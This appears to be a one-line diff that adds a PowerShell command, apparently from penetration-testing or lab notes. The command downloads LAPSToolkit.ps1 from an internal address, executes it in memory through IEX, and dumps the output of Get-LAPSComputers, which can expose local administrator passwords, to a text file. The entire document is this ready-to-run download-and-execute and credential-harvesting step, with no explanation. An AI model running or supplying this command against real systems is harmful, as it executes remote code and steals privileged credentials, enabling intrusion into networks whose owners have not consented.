@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadString('http://192.168.45.233/LAPSToolkit.ps1') | IEX; Get-LAPSComputers | Out-File -FilePath .\tc223.txt
